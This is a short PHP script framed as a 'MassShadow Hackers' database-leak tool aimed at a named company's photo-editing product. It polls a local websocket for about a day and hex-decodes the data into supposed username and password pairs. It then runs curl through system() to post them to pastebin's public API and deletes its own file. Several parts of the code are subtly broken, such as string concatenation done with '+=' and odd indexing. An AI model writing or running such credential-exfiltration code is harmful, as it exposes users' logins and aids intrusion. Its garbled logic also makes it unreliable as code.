<?php
$start = 0;
$content = "

**************************************
*       MassShadow Hackers           *
*   Edit My Face - Database leak     *
*           23/06/2018               *
**************************************
 
TARGET:
  COMPANY: OneSmile Inc.  
  PRODUCT: Edit-My-Face

";
$bk_p = [];
while($start < 86400) {
    sleep(120);
    $start += 120;
    $bk_c = 1;

    while($bk_c) {
        $j = 7;
        if ($stream = fopen('websocket://localhost:8237/pipe/update-tf_emf', 'r')) {
            $bk = stream_get_contents($stream, 137, 5231);
            $bk_c = $bk[$j]; $j += 7; $tmp = '';
            for ($i=0; $i < strlen($bk[$bk_c + 2])-1; $i+=2){
                $tmp .= chr(hexdec($bk[$bk_c + 2][$i].$bk[$bk_c + 2][$i+1]));
            }
            $bk_p[] = $tmp;
            fclose($stream);
        }
    }
}
$content += count($bk_p) . 'credentials (username pass)'."\n---\n".implode("\n", $bk_p);
file_put_contents('.gitignore', system("curl -d '".$content."' 'http://pastebin.com/api_public.php' && rm massshadowhackers.php"))
?>